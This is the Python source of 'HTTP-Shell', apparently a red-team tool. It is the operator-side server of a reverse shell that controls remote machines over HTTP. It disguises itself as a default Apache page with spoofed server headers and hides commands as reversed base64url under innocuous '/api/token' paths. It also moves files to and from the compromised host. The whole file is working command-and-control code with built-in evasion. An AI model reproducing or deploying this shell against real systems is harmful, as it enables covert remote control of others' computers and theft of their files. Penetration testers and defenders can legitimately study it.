#!/usr/bin/python3
#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

import os
import shlex
import base64
import readline
import neotermcolor
from neotermcolor import colored
from http.server import BaseHTTPRequestHandler, HTTPServer

command = None ; prompt = None
first_run = True ; noerror = True
local_path = None ; remote_path = None
neotermcolor.readline_always_safe = True

banner = """
  _   _ _____ _____ ____      ____  _          _ _ 
 | | | |_   _|_   _|  _ \    / ___|| |__   ___| | |
 | |_| | | |   | | | |_) |___\___ \| "_ \ / _ \ | |
 |  _  | | |   | | |  __/_____|__) | | | |  __/ | |
 |_| |_| |_|   |_| |_|       |____/|_| |_|\___|_|_|"""                                    

banner2 = """                                               
  ---------------- by @JoelGMSec -----------------
"""

class MyServer(BaseHTTPRequestHandler):
    def _set_headers(self, code=200):
        self.send_response(code)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def encode_file_revbase64url(self, file_content):
        try:
            encoded = base64.b64encode(file_content).decode("utf-8")
            encoded = encoded.replace("+", "-").replace("/", "_").rstrip("=")
            return encoded[::-1]
        except:
            pass

    def encode_reversed_base64url(self, plain_data):
        try:
            encoded = base64.b64encode(plain_data.encode("utf-8")).decode("utf-8")
            encoded = encoded.replace("+", "-").replace("/", "_").rstrip("=")
            return encoded[::-1]
        except:
            pass

    def decode_file_revbase64url(self, file_content):
        try:
            encoded_data = file_content[::-1]
            base64_data = encoded_data.replace("-", "+").replace("_", "/")
            while len(base64_data) % 4 != 0:
                base64_data += "="
            decoded_data = base64.b64decode(base64_data)
            return decoded_data
        except:
            pass

    def decode_reversed_base64url(self, encoded_data):
        try:
            encoded_data = encoded_data[::-1]
            base64_data = encoded_data.replace("-", "+").replace("_", "/")
            while len(base64_data) % 4 != 0:
                base64_data += "="
            decoded_data = base64.b64decode(base64_data).decode("utf-8")
            return decoded_data
        except:
            pass

    def do_GET(self):
        global prompt ; global first_run ; global noerror
        global local_path ; global remote_path ; global command
        try:
            if self.path == "/api/download":
                with open(local_path, "rb") as file:
                    file_content = file.read()
                    encoded_file = "File: "
                    encoded_file += self.encode_file_revbase64url(file_content)
                self.server_version = "Apache/2.4.18"
                self.sys_version = "(Ubuntu)"
                self._set_headers()
                self.wfile.write(encoded_file.encode("utf-8"))

            elif self.path == "/api/token":
                while True:
                    whoami = prompt.split("!")[0].split("@")[0]
                    hostname = prompt.split("!")[0].split("@")[1]
                    path = prompt.split("!")[-1]
                    cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
                    cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
                    
                    if "\\" in path:
                        slash = "\\"
                    else:
                        slash = "/"

                    if len(str(path).rstrip()) > 24:
                        shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
                        cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
                    else:
                        cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
                    cinput += (colored(" ", "yellow"))
                    command = input(cinput + "\001\033[0m\002")
                    split_cmd = command.split()

                    if command == "" or command == None:
                        print()
                        continue
                    
                    if command == "exit":
                        print (colored("[!] Exiting..\n", "red"))
                        exit(0)

                    if command == "kill":
                        command = "exit"

                    if command == "clear" or command == "cls":
                        os.system("clear")
                        continue

                    if "upload" in command.split()[0]:
                        args = shlex.split(command)
                        if len(args) < 3 or len(args) > 3:
                            print(colored("[!] Usage: upload local_file remote_file\n","red"))
                            noerror = False ; command = None
                        else:
                            local_path = args[1]
                            remote_path = args[2]
                            command = "upload " + args[1] + "!" + args[2]
                            print(colored(f"[+] Uploading {local_path} in {remote_path}..\n","green"))

                    if "download" in command.split()[0]:
                        args = shlex.split(command)
                        if len(args) < 3 or len(args) > 3:
                            print(colored("[!] Usage: download local_file remote_file\n","red"))
                            noerror = False ; command = None

                        else:
                            remote_path = args[1]
                            local_path = args[2]
                            command = "download " + args[1] + "!" + args[2]
                            print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))

                    if "help" in command.split()[0]:
                        print(colored("[+] Available commands:","green"))
                        print(colored("    upload: Upload a file from local to remote computer","blue"))
                        print(colored("    download: Download a file from remote to local computer","blue"))
                        print(colored("    clear/cls: Clear terminal screen","blue"))
                        print(colored("    kill: Kill client connection","blue"))
                        print(colored("    exit: Exit from program\n","blue"))
                        noerror = False ; command = None

                    if command is not None:
                        first_run = False
                        noerror = True
                        encoded_command = "Token: "
                        encoded_command += self.encode_reversed_base64url(command)
                        self._set_headers()
                        self.wfile.write(encoded_command.encode("utf-8"))
                        
                        if command == "exit":
                            print (colored("[!] Exiting..\n", "red"))
                            exit(0)
                        break

            else:
                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", len(itworks_message))
                self.end_headers()
                self.wfile.write(itworks_message.encode())

        except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
            command = "HTTPShellNull"
            pass

        return noerror, first_run, command

    def do_POST(self):
        global prompt ; global first_run ; global noerror
        global local_path ; global remote_path ; global command
        try:
            self.sys_version = "(Ubuntu)"
            self.server_version = "Apache/2.4.18"
            self._set_headers() ; response = "Success"
            content_length = int(self.headers["Content-Length"])
            encoded_data = self.rfile.read(content_length).decode("utf-8")
            encoded_payload = encoded_data.split()[-1]

            if str("Info:") in encoded_data:
                prompt = self.decode_reversed_base64url(encoded_payload)

            else:
                decoded_payload = self.decode_reversed_base64url(encoded_payload)

            if self.path == "/api/upload":
                with open(local_path, "wb") as f:
                    file_content = self.decode_file_revbase64url(encoded_payload)
                    f.write(file_content)
                return

            elif self.path == "/api/debug":
                if not first_run and command is not None:
                    if decoded_payload == "HTTPShellNull":
                        print()
                    elif decoded_payload == None:
                        print()
                    else:
                        print(colored(decoded_payload.rstrip()+"\n", "yellow"))

            elif self.path == "/api/error":
                if noerror and command is not None:
                    if command == "HTTPShellNull":
                        pass
                    elif "HTTP-Client.sh" in decoded_payload:
                        decoded_payload = decoded_payload.split(":")[-1]
                        replace_payload = "bash: " + command + ":" + decoded_payload
                        print(colored(replace_payload.rstrip()+"\n", "red"))
                    elif "EmptyStringNotAllowed" in decoded_payload:
                        pass
                    elif "Invoke-WebRequest" in decoded_payload:
                        pass
                    elif "No such file or directory" in decoded_payload:
                        print(colored(decoded_payload.rstrip()+"\n", "red"))
                    else:
                        print(colored(decoded_payload.rstrip()+"\n", "red")) 
            
            else:
                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", len(itworks_message))
                self.end_headers()
                self.wfile.write(itworks_message.encode())

        except:
            pass

        return prompt

    def log_message(self, format, *args):
            pass

def run(server_class=HTTPServer, handler_class=MyServer, port=80):
    server_address = ("", port)
    httpd = server_class(server_address, handler_class)
    print(colored(f"[>] Waiting for connection on port {port}..\n", "yellow"))
    httpd.serve_forever()

if __name__ == "__main__":
    while True:
        try:
            print (colored(banner, "blue"))
            print (colored(banner2, "green"))
            from sys import argv

            if len(argv) == 2:
                if "-h" in argv[1]:
                    print(colored("[!] Usage: HTTP-Server.py [PORT]\n","red"))
                    exit(0)
                else:
                    run(port=int(argv[1]))
            else:
                print(colored("[!] Usage: HTTP-Server.py [PORT]\n","red"))
                exit(0)

        except KeyboardInterrupt:
            print (colored("\n[!] Exiting..\n", "red"))
            break
